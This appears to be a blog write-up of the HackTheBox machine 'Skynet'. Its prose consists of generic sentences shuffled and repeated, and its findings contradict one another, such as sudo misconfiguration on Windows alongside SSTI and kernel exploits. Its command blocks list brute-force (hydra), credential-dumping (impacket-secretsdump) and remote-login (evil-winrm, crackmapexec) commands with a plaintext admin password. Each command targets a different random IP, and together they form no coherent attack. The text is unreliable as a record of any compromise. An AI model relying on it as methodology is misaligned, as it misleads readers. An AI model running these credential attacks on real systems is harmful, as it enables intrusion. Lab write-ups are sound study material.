---
TitleSEO: "HackTheBox — Skynet (Easy Windows) | ZureFX"
TitlePost: "HackTheBox — Skynet (Easy Windows)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Skynet. Unquoted Service Path and Sudo Misconfiguration to achieve easy compromise on Windows."
Keywords: "active directory, hackthebox, easy, pwntilldawn, windows, medium"
URL: "https://zurefx.github.io/writeups/htb-skynet-566.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-skynet-566/"
Date: "2025-06-05"
Tags: "Active Directory, HackTheBox, Easy, PwnTillDawn, Windows, Medium"
Section: "writeups"
Lang: "en"
main_img: "htb-skynet-566"
Permalink: "/writeups/htb-skynet-566.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Skynet** is rated **Easy** on HackTheBox. It runs **Windows** and the IP address during this analysis was `10.73.165.192`.

### Objectives

Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.66.30.24/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.107.72.150/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.122.130
gobuster dir -u http://10.34.11.12/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.41.12.109
```

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

### SMB Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
feroxbuster -h
```

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service. The kernel version was outdated and vulnerable to a publicly known exploit.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **Sudo Misconfiguration**.

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Initial Access

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.32.174.172 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
gobuster dir -u http://10.83.221.112/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

## Privilege Escalation

### Enumeration

Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files.

```powershell
crackmapexec smb 10.126.194.84 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.17.211/FUZZ
gobuster dir -u http://10.18.49.207/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.94.22.124/FUZZ
nmap -sCV -p8080,9200,5432 10.43.244.151 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.33.21.14 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.103.102.113 -u administrator -p 'P@ssw0rd!'
```

The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory.

## Summary

### Tools Used

- `mimikatz`
- `rubeus`
- `ldapsearch`
- `GetUserSPNs`
- `atexec`

### Key Takeaways

- Unquoted Service Path
- Sudo Misconfiguration
